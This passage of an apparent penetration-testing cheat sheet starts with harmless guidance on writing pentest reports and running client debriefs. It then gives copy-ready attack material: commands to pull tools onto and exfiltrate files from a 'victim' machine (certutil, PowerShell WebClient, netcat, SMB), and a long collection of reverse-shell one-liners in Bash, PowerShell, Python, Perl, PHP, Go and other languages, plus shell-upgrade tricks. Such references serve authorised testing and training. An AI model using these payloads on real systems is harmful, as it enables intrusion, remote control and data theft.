                <li><strong>Executive Summary</strong> - Provide a high-level summary of the findings, tailored for
                  non-technical stakeholders, with a focus on business impact.</li>
                <li><strong>Scope and Methodology</strong> - Define the scope of the engagement and describe the testing
                  methods used (e.g., black-box, gray-box).</li>
                <li><strong>Finding Severity Levels</strong> - Clearly label vulnerabilities by severity (Critical,
                  High,
                  Medium, Low), with justifications for each categorization.</li>
                <li><strong>Proof of Concept (PoC)</strong> - Include reproducible steps, screenshots, or code snippets
                  that verify the vulnerability&#39;s existence.</li>
                <li><strong>Remediation Recommendations</strong> - Offer clear and actionable steps to address and fix
                  each issue, along with prioritization based on severity.</li>
              </ul>
              <h3 id="164-report-formatting">16.4 Report Formatting</h3>
              <p>Consider these formatting tips:</p>
              <ul>
                <li><strong>Fonts</strong> - Use clean and legible fonts like Arial, Calibri, or Helvetica.</li>
                <li><strong>Headings and Subheadings</strong> - Establish a clear hierarchy using consistent font sizes
                  for titles, sections, and subsections.</li>
                <li><strong>Table of Contents</strong> - Include a TOC to improve navigation in longer reports.</li>
                <li><strong>Code Blocks</strong> - Properly format code snippets with syntax highlighting using tools
                  like
                  Prism.js or highlight.js for clarity.</li>
                <li><strong>Bullet Points &amp; Numbering</strong> - Use these consistently to organize lists of
                  findings,
                  recommendations, or steps.</li>
              </ul>
              <h3 id="165-proof-of-concept-poc">16.5 Proof of Concept (PoC)</h3>
              <p>Effectively presenting PoC details is critical to proving the existence of vulnerabilities:</p>
              <ul>
                <li><strong>Detailed Steps</strong> - Provide detailed, reproducible steps showing how the vulnerability
                  was discovered and exploited.</li>
                <li><strong>Screenshots</strong> - Attach screenshots or videos demonstrating the exploit attempt.</li>
                <li><strong>Code Samples</strong> - Include relevant code snippets, formatted for readability and easy
                  copy-pasting.</li>
              </ul>
              <h3 id="166-compliance-reporting-optional">16.6 Compliance Reporting (Optional)</h3>
              <p>If the engagement requires compliance reporting, create reports tailored to industry standards:</p>
              <ul>
                <li><strong>Compliance Frameworks</strong> - Align findings with specific industry standards such as PCI
                  DSS, GDPR, NIST, or ISO 27001.</li>
                <li><strong>Custom Reports</strong> - Generate reports that focus on areas of interest related to
                  compliance (e.g., data protection, encryption).</li>
              </ul>
              <h3 id="167-common-mistakes-to-avoid">16.7 Common Mistakes to Avoid</h3>
              <ul>
                <li><strong>Vague Findings</strong> - Provide detailed descriptions of vulnerabilities, including their
                  impact and risk levels.</li>
                <li><strong>Lack of Context</strong> - Always relate findings back to the business environment,
                  explaining
                  how they affect the tested infrastructure or operations.</li>
                <li><strong>Overloading with Jargon</strong> - Make sure non-technical stakeholders can understand the
                  key
                  points by avoiding excessive technical jargon in high-level sections.</li>
              </ul>
              <h3 id="168-structure-for-each-vulnerability">16.8 Structure for Each Vulnerability</h3>
              <p>When documenting vulnerabilities in a report, it&#39;s important to include key components to ensure
                clarity, reproducibility, and actionable remediation. Each vulnerability should contain the following
                sections:</p>
              <ol>
                <li>
                  <p><strong>Title</strong>:</p>
                  <ul>
                    <li><em>Clear and Descriptive</em>: The title should briefly describe the vulnerability and its
                      impact
                      (e.g., &quot;SQL Injection in Login Form&quot; or &quot;Cross-Site Scripting in Contact Us
                      Page&quot;).</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Severity Rating</strong>:</p>
                  <ul>
                    <li><em>Severity Level</em>: Categorize the vulnerability based on its potential impact using labels
                      such as Critical, High, Medium, or Low.</li>
                    <li><em>CVSS Score (Optional)</em>: Optionally include a Common Vulnerability Scoring System (CVSS)
                      score to quantify the risk.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Affected Component</strong>:</p>
                  <ul>
                    <li><em>Specific Location</em>: Indicate where the vulnerability was found (e.g., URL, API endpoint,
                      or specific application module).</li>
                    <li><em>System/Environment</em>: If applicable, describe the affected environment (e.g., web server,
                      backend API, database).</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Description</strong>:</p>
                  <ul>
                    <li><em>Overview of the Issue</em>: Provide a brief, non-technical explanation of the vulnerability,
                      outlining what it is and why it is a problem.</li>
                    <li><em>Technical Explanation</em>: Offer a more detailed, technical description of the issue for
                      readers who need to understand the underlying cause.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Impact</strong>:</p>
                  <ul>
                    <li><em>Business Impact</em>: Explain the potential consequences if the vulnerability is exploited,
                      emphasizing the risk to the business or system.</li>
                    <li><em>Technical Impact</em>: Clarify the technical implications (e.g., data exposure, unauthorized
                      access, privilege escalation).</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Proof of Concept (PoC)</strong>:</p>
                  <ul>
                    <li><em>Detailed Reproduction Steps</em>: Include a step-by-step guide to reproduce the
                      vulnerability,
                      allowing others to verify its existence.<ul>
                        <li>Start from login or user interaction.</li>
                        <li>Specify any input values, requests, or commands used.</li>
                        <li>Provide detailed steps for both the attack and verification of the vulnerability.</li>
                      </ul>
                    </li>
                    <li><em>Screenshots or Videos</em>: Attach supporting media that visually documents the
                      vulnerability
                      (e.g., screenshots of the exploit).</li>
                    <li><em>Code Snippets</em>: Include sample code, scripts, or request/response payloads that were
                      used
                      in the exploitation.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Exploitation Risks</strong>:</p>
                  <ul>
                    <li><em>Ease of Exploitation</em>: Comment on how difficult or easy it is to exploit this
                      vulnerability (e.g., requires authenticated user, works on unauthenticated users).</li>
                    <li><em>Likelihood of Exploitation</em>: Assess the likelihood of the vulnerability being discovered
                      and exploited in the wild.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Remediation Recommendations</strong>:</p>
                  <ul>
                    <li><em>Clear Instructions</em>: Provide actionable and specific remediation steps to address the
                      vulnerability.<ul>
                        <li>Example: ‚ÄúSanitize user inputs to prevent SQL injection attacks.‚Äù</li>
                      </ul>
                    </li>
                    <li><em>Long-Term Fixes</em>: Suggest best practices or frameworks that could prevent similar
                      vulnerabilities in the future (e.g., input validation libraries).</li>
                    <li><em>Reference Material</em>: Include links to security guidelines or official documentation that
                      can aid in fixing the issue (e.g., OWASP references).</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Affected Versions/Systems (Optional)</strong>:</p>
                  <ul>
                    <li><em>Version Information</em>: Specify the versions of software, applications, or systems
                      affected
                      by this vulnerability.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Additional Notes (Optional)</strong>:</p>
                  <ul>
                    <li><em>Caveats/Conditions</em>: Mention any special conditions or configurations required to
                      trigger
                      the vulnerability.</li>
                    <li><em>Temporary Mitigation</em>: If a full fix isn&rsquo;t possible immediately, suggest temporary
                      steps
                      to reduce risk (e.g., disabling certain features or services).</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Compliance Impact (Optional)</strong>:</p>
                  <ul>
                    <li><em>Link to Compliance</em>: If applicable, relate the vulnerability to compliance requirements
                      (e.g., PCI DSS, GDPR) and how its exploitation might affect the organization&rsquo;s regulatory
                      standing.
                    </li>
                  </ul>
                </li>
              </ol>
              <h3 id="169-tips-for-debrief-sessions">16.9 Tips for Debrief Sessions</h3>
              <p>Debrief sessions are an essential part of the penetration testing process, where findings are presented
                to the client or stakeholders. <strong>The goal is to ensure they understand the vulnerabilities
                  discovered, the associated risks, and how to implement remediation</strong>. Below are important tips
                and best practices for making these sessions productive and informative.</p>
              <ol>
                <li>
                  <p><strong>Know Your Audience</strong>:</p>
                  <ul>
                    <li><em>Tailor Your Message</em>: Gauge the technical level of the participants. For non-technical
                      stakeholders, focus on business risks and high-level recommendations. For technical teams, dive
                      into
                      more specific technical details and remediation steps.</li>
                    <li><em>Avoid Jargon</em>: Use clear, simple language when explaining vulnerabilities, especially
                      with
                      non-technical attendees. Avoid technical jargon unless the audience is highly familiar with it.
                    </li>
                  </ul>
                </li>
                <li>
                  <p><strong>Start with the Executive Summary</strong>:</p>
                  <ul>
                    <li><em>High-Level Overview</em>: Begin the session with a high-level summary of the test, key
                      findings, and overall security posture.</li>
                    <li><em>Highlight Critical Risks</em>: Emphasize the most critical vulnerabilities first and discuss
                      their potential business impact before diving into details.</li>
                    <li><em>Present Positive Outcomes</em>: Balance the discussion by also highlighting areas where the
                      system performed well in terms of security, especially improvements from previous tests.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Explain the Impact Clearly</strong>:</p>
                  <ul>
                    <li><em>Business Impact</em>: For each vulnerability, explain what the real-world consequences might
                      be if it were exploited. Use examples or case studies where possible to help contextualize the
                      risks.</li>
                    <li><em>Risk to Reputation</em>: Emphasize how vulnerabilities might affect the company&rsquo;s
                      reputation,
                      customer trust, or regulatory compliance.</li>
                    <li><em>Technical Impact</em>: For technical audiences, focus on how the vulnerability could lead to
                      further compromise (e.g., privilege escalation, unauthorized access, data breaches).</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Prioritize Findings</strong>:</p>
                  <ul>
                    <li><em>Risk-Based Prioritization</em>: Use a risk-based approach to guide stakeholders through the
                      vulnerabilities. Rank findings by severity (Critical, High, Medium, Low), focusing first on those
                      that pose the most significant threat.</li>
                    <li><em>Quick Wins</em>: Highlight any &quot;quick fixes&quot; that can be easily implemented to
                      reduce risk immediately.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Provide Clear Remediation Steps</strong>:</p>
                  <ul>
                    <li><em>Actionable Recommendations</em>: Offer clear and concise remediation steps for each
                      vulnerability. Avoid vague suggestions and focus on actionable solutions.</li>
                    <li><em>Provide Resources</em>: Offer additional references or documentation (e.g., OWASP guides,
                      vendor patches) to help the technical teams in the remediation process.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Always Explain Each Vulnerability</strong>:</p>
                  <ul>
                    <li><em>General Explanation</em>: Start by explaining the vulnerability in general terms to ensure
                      the
                      stakeholders understand its nature (e.g., Cross-Site Scripting, SQL Injection).</li>
                    <li><em>Application-Specific</em>: Then, explain how the vulnerability applies specifically to the
                      application you tested, detailing where and how it was identified.</li>
                    <li><em>Remediation Recommendation</em>: Provide a recommendation for fixing the vulnerability,
                      offering clear steps that align with industry best practices or specific to the client&#39;s
                      environment.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Encourage Questions</strong>:</p>
                  <ul>
                    <li><em>Foster Engagement</em>: Invite questions throughout the session and be prepared to clarify
                      technical details or discuss the reasoning behind your findings.</li>
                    <li><em>Provide Examples</em>: Use live demonstrations or examples of Proof of Concept (PoC)
                      exploits
                      to make explanations more tangible.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Emphasize Collaboration</strong>:</p>
                  <ul>
                    <li><em>Work as a Team</em>: Frame the conversation around teamwork and collaboration. Let the
                      client
                      know that you&rsquo;re there to help them strengthen their security posture rather than just
                      pointing out
                      flaws.</li>
                    <li><em>Discuss Roadblocks</em>: Ask if there are any obstacles they foresee in implementing the
                      recommendations (e.g., resource constraints) and offer to adjust recommendations accordingly.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Offer Next Steps</strong>:</p>
                  <ul>
                    <li><em>Follow-Up Plan</em>: Conclude the session by outlining the next steps, such as patching the
                      vulnerabilities, scheduling a retest, or reviewing security policies.</li>
                    <li><em>Long-Term Recommendations</em>: Suggest long-term improvements (e.g., security awareness
                      training, implementing regular security testing, adopting secure development practices).</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Be Prepared for Resistance</strong>:</p>
                  <ul>
                    <li><em>Anticipate Pushback</em>: Some stakeholders may push back on certain findings, especially if
                      they feel the risk is minimal or the fix is costly. Be prepared with data, examples, and risk
                      assessments to back up your findings.</li>
                    <li><em>Address Concerns</em>: If they raise concerns about specific remediation steps, work with
                      them
                      to identify alternative solutions that still address the vulnerability.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Document Everything</strong>:</p>
                  <ul>
                    <li><em>Meeting Notes</em>: Take detailed notes during the debrief session to capture feedback,
                      concerns, and decisions. This ensures that everyone is aligned and that there is a clear record of
                      what was discussed.</li>
                    <li><em>Share Summary</em>: After the meeting, distribute a summary document that includes the key
                      points covered, any decisions made, and agreed-upon next steps.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Use Visual Aids</strong>:</p>
                  <ul>
                    <li><em>Slides or Diagrams</em>: Use slides, charts, or network diagrams to visually explain complex
                      concepts or architecture flaws. Visuals help simplify the communication of technical points.</li>
                    <li><em>Screenshots of Vulnerabilities</em>: Incorporate screenshots or video demonstrations from
                      the
                      report to illustrate critical findings.</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Focus on Continuous Improvement</strong>:</p>
                  <ul>
                    <li><em>Reinforce Ongoing Testing</em>: Encourage the client to consider penetration testing as part
                      of their regular security process. Stress that security is an ongoing effort, not a one-time
                      exercise.</li>
                    <li><em>Track Remediation Progress</em>: Suggest periodic check-ins or retests to ensure
                      vulnerabilities are patched and that new security measures are effective.</li>
                  </ul>
                </li>
              </ol>

              <h2 id="17-file-transfers">17. <span class="emoji">üóÇÔ∏è</span> File Transfers</h2>
              <h3 id="171-rdp-shared-folder">17.1 RDP shared folder</h3>
              <ul>
                <li>Using xfreerdp</li>
              </ul>
              <pre><code class="language-bash">xfreerdp /compression +auto-reconnect /u:[user] /p:&#39;[password]&#39; /v:[IP] +clipboard /size:1920x1080 /drive:desktop,/home/[your_username]/Desktop
</code></pre>
              <ul>
                <li>Using rdesktop</li>
              </ul>
              <pre><code class="language-bash">rdesktop -z -P -x m -u [user] -p [password] [IP] -r disk:test=/home/[your_username]/Desktop
</code></pre>

              <h2 id="172-impacket-tools">17.2 Impacket Tools</h2>
              <ul>
                <li><strong>PsExec</strong>: <ul>
                    <li><code>lget</code> to download from the victim.</li>
                    <li><code>lput</code> upload files from the Kali to the victim.</li>
                  </ul>
                </li>
                <li><strong>VmiExec</strong>: <ul>
                    <li><code>lget</code> to download from the victim.</li>
                    <li><code>lput</code> upload files from the Kali to the victim.</li>
                  </ul>
                </li>
                <li><strong>Evil-WinRM</strong>: <ul>
                    <li><code>download [file_name] [optional_file_destination_path]</code> to download from the
                      victim.</li>
                    <li><code>upload [file_name] [optional_file_destination_path]</code> upload files from the Kali
                      to the victim.</li>
                  </ul>
                </li>
              </ul>
              <h3 id="173-ftp">17.3 FTP</h3>
              <p>We need to set the binary mode because with ASCII mode won&#39;t work: <code>binary</code>.</p>
              <h3 id="174-smb">17.4 SMB</h3>
              <ul>
                <li>On the attacker Kali machine:</li>
              </ul>
              <pre><code class="language-bash">impacket-smbserver [name_we_give_to_this_share] . -smb2support  -username my_user -password my_password
</code></pre>
              <ul>
                <li>On the victim Windows machine:</li>
              </ul>
              <pre><code class="language-bash">net use m: \\[my_kali_IP]\[name_we_gave_to_the_share] /user:my_user my_password
</code></pre>
              <h3 id="175-http-requests">17.5 HTTP Requests</h3>
              <ul>
                <li>Set HTTP Server in our Kali</li>
              </ul>
              <pre><code class="language-powershell">python3 -m http.server 80

(new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.119.138:800/chisel.exe&#39;,&#39;C:\Windows\Tasks\chisel.exe&#39;)
</code></pre>
              <ul>
                <li>Download in Windows (different options)</li>
              </ul>
              <pre><code class="language-bash"># From PowerShell
(New-Object System.Net.WebClient).DownloadFile(&#39;http://[kali_IP]/[file_to_download]&#39;, &#39;[output_file_name_or_path]&#39;)

Invoke-WebRequest -Uri http://[kali_IP]/[file_to_download] -OutFile [output_file_name]

# If iwr does not work 
certutil -urlcache -split -f http://[kali_IP]/[file_to_download]

# From CMD
powershell -Command &quot;(New-Object Net.WebClient).DownloadFile(&#39;http://[kali_IP]/[file_to_download]&#39;, &#39;[output_file_name_or_path]&#39;)&quot;
</code></pre>
              <h3 id="176-php-script-bring-files-from-windows">17.6 PHP Script (bring files from Windows)</h3>
              <ol>
                <li>Create the file <code>upload.php</code> in Kali</li>
              </ol>
              <pre><code class="language-php">&lt;?php
  $uploaddir = &#39;/var/www/uploads/&#39;;

  $uploadfile = $uploaddir . $_FILES[&#39;file&#39;][&#39;name&#39;];

  move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadfile)
?&gt;
</code></pre>
              <ol start="2">
                <li>Move the file to specific folder <code>var/www/uploads</code></li>
              </ol>
              <pre><code class="language-bash">chmod +x upload.php

sudo mkdir /var/www/uploads

mv upload.php /var/www/uploads
</code></pre>
              <ol start="3">
                <li>Start the Apache server</li>
              </ol>
              <pre><code class="language-bash">service apache2 start

ps -ef | grep apache
</code></pre>
              <ol start="4">
                <li>Send the files from the Windows</li>
              </ol>
              <pre><code class="language-powershell">powershell (New-Object System.Net.WebClient).UploadFile(&#39;http://&lt;your Kali ip&gt;/upload.php&#39;, &#39;&lt;file you want to transfer&gt;&#39;)
</code></pre>
              <ol start="5">
                <li>Stop the Apache server</li>
              </ol>
              <pre><code class="language-bash">service apache2 stop
</code></pre>

              <h3 id="177-netcat">17.7 Netcat</h3>
              <h4 id="1771-send-a-file">17.7.1 Send a File</h4>
              <ol>
                <li><strong>On the receiver machine:</strong>
                  Start listening on a specific port and redirect the incoming file to a local file.</li>
              </ol>
              <pre><code class="language-bash">nc -lvp 4444 &gt; received_file.txt

# (Optional) If we need to transfer the files over an encrypted connection just attach the --ssl option
ncat --ssl -lvp 4444 &gt; received_file.txt
</code></pre>
              <ol start="2">
                <li><strong>On the sender machine:</strong>
                  Send the file to the receiver&rsquo;s IP address on the same port.</li>
              </ol>
              <pre><code class="language-bash">nc &lt;receiver_IP&gt; 4444 &lt; file_to_send.txt

# (Optional) If we need to receive the files over an encrypted connection just attach the --ssl option
ncat --ssl &lt;receiver_IP&gt; 4444 &lt; file_to_send.txt
</code></pre>
              <h4 id="1772-send-a-file-with-compression">17.7.2 Send a File with Compression</h4>
              <p>Compressing the file before sending can speed up the transfer:</p>
              <ol>
                <li><strong>On the receiver machine:</strong></li>
              </ol>
              <pre><code class="language-bash">nc -lvp 4444 | tar xzvf -
</code></pre>
              <ol start="2">
                <li><strong>On the sender machine:</strong></li>
              </ol>
              <pre><code class="language-bash">tar czvf - file_or_folder_to_send | nc &lt;receiver_IP&gt; 4444
</code></pre>
              <h3 id="178-using-base64-contents">17.8 Using Base64 Contents</h3>
              <h4 id="1781-transferring-base64-via-copy-and-paste">17.8.1 Transferring Base64 via Copy and Paste</h4>
              <p>Sometimes, you may need to transfer a file by copying and pasting its Base64-encoded contents directly
                in a terminal session. This method can be useful when you can&#39;t transfer files directly, but can
                transfer text.</p>
              <ol>
                <li><strong>Encode the file and print its Base64-encoded contents in the terminal:</strong></li>
              </ol>
              <pre><code class="language-bash"># This will print the Base64 string directly in the terminal, which you can copy manually
base64 file_to_send.txt
</code></pre>
              <ol start="2">
                <li><strong>On the receiver machine:</strong></li>
              </ol>
              <pre><code class="language-bash"># You can manually paste the Base64-encoded content into a new file
echo &quot;PASTE_BASE64_CONTENTS_HERE&quot; | base64 -d &gt; received_file.txt
</code></pre>
              <h4 id="1782-transferring-base64-contents-via-netcat">17.8.2 Transferring Base64 Contents via Netcat</h4>
              <ol>
                <li><strong>On the receiver machine:</strong></li>
              </ol>
              <pre><code class="language-bash">nc -lvp 4444 | base64 -d &gt; received_file.txt
</code></pre>
              <ol start="2">
                <li><strong>On the sender machine:</strong></li>
              </ol>
              <pre><code class="language-bash">base64 file_to_send.txt | nc &lt;receiver_IP&gt; 4444
</code></pre>

              <h2 id="18-utilities">18. <span class="emoji">üõ†Ô∏è</span> Utilities</h2>
              <h3 id="181-reverse-shells">18.1 Reverse Shells</h3>
              <h4 id="1811-bash">18.1.1 Bash</h4>
              <p><strong>Normal Request</strong></p>
              <pre><code class="language-bash"># Direct Bash reverse shell
/bin/bash -i &gt;&amp; /dev/tcp/&lt;TARGET_IP&gt;/&lt;TARGET_PORT&gt; 0&gt;&amp;1

# Add the reverse shell to an existing file
echo &#39;/bin/bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1&#39; &gt;&gt; file
</code></pre>
              <p><strong>One-Liners</strong></p>
              <pre><code class="language-bash"># FIFO method with Netcat
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc &lt;TARGET_IP&gt; &lt;TARGET_PORT&gt; &gt;/tmp/f

# Using &#39;sh&#39; for reverse shell
sh -i &gt;&amp; /dev/tcp/&lt;TARGET_IP&gt;/&lt;TARGET_PORT&gt; 0&gt;&amp;1
</code></pre>
              <h4 id="1812-cmd">18.1.2 CMD</h4>
              <p>CMD does not have a direct command to get a reverse shell, so we first need to download Netcat to the
                Windows system and then use it to get the reverse shell, sometimes Netcat can be already installed in
                <code>C:\Windows\System32\nc.exe</code>.
              </p>
              <pre><code class="language-bash"># Download Netcat from a CMD
certutil.exe -urlcache -split -f http://[attacker_ip]/nc.exe nc.exe

# Execute the reverse shell command
.\nc.exe 192.168.45.215 444 -e cmd.exe

# (Optional) use double backslash to handling special character if it is part of an injection command
.\\\\nc.exe 192.168.45.215 444 -e cmd.exe
</code></pre>
              <h4 id="1813-golang">18.1.3 Golang</h4>
              <pre><code class="language-bash">echo &#39;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main(){c,_:=net.Dial(&quot;tcp&quot;,&quot;&lt;TARGET_IP&gt;:&lt;TARGET_PORT&gt;&quot;);cmd:=exec.Command(&quot;/bin/sh&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}&#39; &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go
</code></pre>
              <h4 id="1814-java">18.1.4 Java</h4>
              <pre><code class="language-java">r = Runtime.getRuntime()
p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/&lt;TARGET_IP&gt;/&lt;TARGET_PORT&gt;;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
p.waitFor()
</code></pre>
              <h4 id="1815-lua">18.1.5 Lua</h4>
              <pre><code class="language-bash">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;&lt;TARGET_IP&gt;&#39;,&lt;TARGET_PORT&gt;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;
</code></pre>
              <h4 id="1816-netcat">18.1.6 Netcat</h4>
              <pre><code class="language-bash"># Using -e
nc &lt;TARGET_IP&gt; &lt;TARGET_PORT&gt; -e /bin/sh
nc -nv &lt;TARGET_IP&gt; &lt;TARGET_PORT&gt; -e /bin/bash

# Without -e option
mkfifo /tmp/f; nc &lt;TARGET_IP&gt; &lt;TARGET_PORT&gt; &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1; rm /tmp/f

# Add the reverse shell to an existing file
echo &#39;nc [lhost] [lport] -e /bin/bash&#39; &gt;&gt; [file]
</code></pre>
              <h4 id="1817-perl">18.1.7 Perl</h4>
              <pre><code class="language-bash">perl -e &#39;use Socket;$i=&quot;&lt;TARGET_IP&gt;&quot;;$p=&lt;TARGET_PORT&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
</code></pre>
              <h4 id="1818-powershell">18.1.8 PowerShell</h4>
              <pre><code class="language-powershell"># Main Option
powershell -nop -W hidden -noni -ep bypass -c &quot;$TCPClient = New-Object Net.Sockets.TCPClient(&#39;&lt;TARGET_IP&gt;&#39;, &lt;TARGET_PORT&gt;);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + &#39;SHELL&gt; &#39;);$StreamWriter.Flush()}WriteToStream &#39;&#39;;while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2&gt;&amp;1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()&quot;

# Alternative
powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;&lt;TARGET_IP&gt;&#39;, &lt;TARGET_PORT&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}&quot;
</code></pre>
              <h4 id="1819-php">18.1.9 PHP</h4>
              <pre><code class="language-bash">php -r &#39;$sock=fsockopen(&quot;&lt;TARGET_IP&gt;&quot;,&lt;TARGET_PORT&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
</code></pre>
              <h4 id="18110-python">18.1.10 Python</h4>
              <pre><code class="language-bash">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;TARGET_IP&gt;&quot;,&lt;TARGET_PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
</code></pre>
              <h4 id="18111-ruby">18.1.11 Ruby</h4>
              <pre><code class="language-bash">ruby -rsocket -e &#39;f=TCPSocket.open(&quot;&lt;TARGET_IP&gt;&quot;,&lt;TARGET_PORT&gt;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
</code></pre>
              <h4 id="18112-socat">18.1.12 Socat</h4>
              <pre><code class="language-bash">socat TCP:&lt;TARGET_IP&gt;:&lt;TARGET_PORT&gt; EXEC:/bin/bash
</code></pre>
              <h4 id="18113-telnet">18.1.13 Telnet</h4>
              <pre><code class="language-bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet &lt;TARGET_IP&gt; &lt;TARGET_PORT&gt; 0&lt;/tmp/p | /bin/sh 1&gt;/tmp/p 2&gt;&amp;1
</code></pre>
              <h4 id="18114-tool-for-generating-reverse-shell">18.1.14 Tool for Generating Reverse Shell</h4>
              <pre><code class="language-bash">git clone https://github.com/ShutdownRepo/shellerator
pip3 install --user -r requirements.txt
sudo cp shellrator.py /bin/shellrator

shellrator
</code></pre>
              <h3 id="182-upgrade-shells">18.2 Upgrade Shells</h3>
              <h4 id="1821-adjust-interactive-shells">18.2.1 Adjust Interactive Shells</h4>
              <pre><code class="language-bash"># Find terminal size (replace values with actual output)
stty size  # Example output: 50 235

# Background the shell and adjust settings
Ctrl-Z
stty raw -echo  # Disable shell echo
fg
export SHELL=bash
export TERM=xterm  # Or use xterm-256color for extended color support

# Set terminal size
stty rows &lt;ROWS&gt; columns &lt;COLS&gt;
</code></pre>
              <h4 id="1822-bash">18.2.2 Bash</h4>
              <pre><code class="language-bash"># Spawn a new Bash shell
bash -i
</code></pre>
              <h4 id="1823-lua">18.2.3 Lua</h4>
              <pre><code class="language-lua"># Execute a new Bash shell
os.execute(&#39;/bin/bash&#39;)
</code></pre>
              <h4 id="1824-perl">18.2.4 Perl</h4>
              <pre><code class="language-bash"># Execute a new Bash shell
perl -e &#39;exec &quot;/bin/bash&quot;&#39;
</code></pre>
              <h4 id="1825-python">18.2.5 Python</h4>
              <pre><code class="language-python"># Python 2.x
python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;

# Python 3.x
python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;

# Upgrade to a TTY shell with Python
python -c &#39;import pty; import os; pty.spawn(&quot;/bin/bash&quot;); os.system(&quot;stty raw -echo&quot;)&#39;
</code></pre>
              <h4 id="1826-ruby">18.2.6 Ruby</h4>
              <pre><code class="language-ruby"># Execute a new Bash shell
exec &quot;/bin/bash&quot;
</code></pre>
              <h4 id="1827-sh">18.2.7 Sh</h4>
              <pre><code class="language-sh"># Spawn a new interactive shell
sh -i
</code></pre>
              <h3 id="183-tools">18.3 Tools</h3>
              <h4 id="1831-linux">18.3.1 Linux</h4>
              <h5 id="18311-bloodhound-tools">18.3.1.1 BloodHound Tools</h5>
              <ul>
                <li><strong>bloodhound-python</strong>: Python implementation of BloodHound for AD enumeration.</li>
              </ul>
              <h5 id="18312-privilege-escalation-scripts">18.3.1.2 Privilege Escalation Scripts</h5>
              <ul>
                <li><strong>LinEnum</strong>: <a href="https://github.com/rebootuser/LinEnum">GitHub</a></li>
                <li><strong>LinPEAS</strong>: <a
                    href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">GitHub</a>
                </li>
                <li><strong>Unix-privesc-check</strong>: <a
                    href="https://github.com/pentestmonkey/unix-privesc-check">GitHub</a></li>
              </ul>
              <h5 id="18313-security-tools">18.3.1.3 Security Tools</h5>
              <ul>
                <li><strong>Checksec</strong>: <a href="https://github.com/slimm609/checksec.sh">GitHub</a></li>
                <li><strong>Exploit Suggester</strong>: <a href="https://github.com/EnzoP/Exploit-Suggester">GitHub</a>
                </li>
                <li><strong>Peepdf</strong>: <a href="https://github.com/jesobreira/peepdf">GitHub</a></li>
                <li><strong>Pspy</strong>: <a href="https://github.com/DominicBreuker/pspy">GitHub</a> - Snoop on
                  processes without root permissions.</li>
              </ul>
